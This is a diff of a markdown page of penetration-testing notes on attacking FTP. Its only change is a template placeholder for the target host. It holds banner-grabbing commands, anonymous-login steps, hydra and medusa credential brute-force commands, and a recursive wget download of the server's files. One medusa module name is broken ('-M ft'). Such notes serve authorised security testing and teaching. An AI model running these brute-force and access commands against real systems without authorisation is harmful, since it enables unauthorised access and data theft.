@@ -15,22 +15,22 @@ FTP is built on a client-server architecture using separate control and data con
 #### Telnet
 
 ```sh
-telnet {{< param rhost >}} 21
+telnet {{< param "war.rhost" >}} 21
 ```
 
 #### Netcat
 ```sh
-nc -n {{< param rhost >}} 21
+nc -n {{< param "war.rhost" >}} 21
 ```
 
 #### Nmap
 ```sh
-nmap -sV -script=banner -p21 -Pn {{< param rhost >}}
+nmap -sV -script=banner -p21 -Pn {{< param "war.rhost" >}}
 ```
 
 #### FTP
 ```sh
-ftp {{< param rhost >}}
+ftp {{< param "war.rhost" >}}
 ```
 
 ## FTP Exploits Search
@@ -46,9 +46,9 @@ During the [port scanning]({{< ref "port-scanning" >}}) phase Nmap's script scan
 Try anonymous login using `anonymous:anonymous` credentials.
 
 ```sh
-ftp {{< param rhost >}}
+ftp {{< param "war.rhost" >}}
 …
-Name ({{< param rhost >}}:kali): anonymous
+Name ({{< param "war.rhost" >}}:kali): anonymous
 331 Please specify the password.
 Password: [anonymous]
 230 Login successful.
@@ -70,7 +70,7 @@ ftp> ls -lat
 Due to its insecure nature, FTP support is being dropped by [Firefox](https://bugzilla.mozilla.org/show_bug.cgi?id=1574475) and [Google Chrome](https://chromestatus.com/feature/6246151319715840).
 {{</hint>}}
 
-Try accessing `ftp://user:pass@{{< param rhost >}}` from your browser.  
+Try accessing `ftp://user:pass@{{< param "war.rhost" >}}` from your browser.  
 If not credentials provided `anonymous:anonymous` is assumed.
 
 ## Brute Forcing
@@ -82,13 +82,13 @@ As an alternative to profiled passwords, [Daniel Miessler's SecLists](https://gi
 Using a colon-separated `user:pass` list.
 
 ```sh
-hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param rhost >}} ftp
+hydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f {{< param "war.rhost" >}} ftp
 ```
 
 Using login user and passwords list.
 
 ```sh
-hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param rhost >}} ftp
+hydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f {{< param "war.rhost" >}} ftp
 ```
 
 {{<details "Parameters">}}
@@ -105,13 +105,13 @@ Medusa's combo files (colon-separated) should be in the format `host:username:pa
 
 ```sh
 sed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt > /tmp/cplist.txt
-medusa -C /tmp/cplist.txt -h {{< param rhost >}} -M ft
+medusa -C /tmp/cplist.txt -h {{< param "war.rhost" >}} -M ft
 ```
 
 Using login user and passwords list.
 
 ```sh
-medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param rhost >}} -M ftp
+medusa -u ftp -P /usr/share/wordlists/rockyou.txt -h {{< param "war.rhost" >}} -M ftp
 ```
 
 {{<details "Parameters">}}
@@ -143,7 +143,7 @@ Binary and ASCII files have to be uploading using the `binary` or `ascii` mode r
 Recursively download FTP folder content.[^so-ftp-mirroring]
 
 ```sh
-wget -m ftp://user:pass@{{< param rhost >}}/
+wget -m ftp://user:pass@{{< param "war.rhost" >}}/
 ```
 
 # Reference
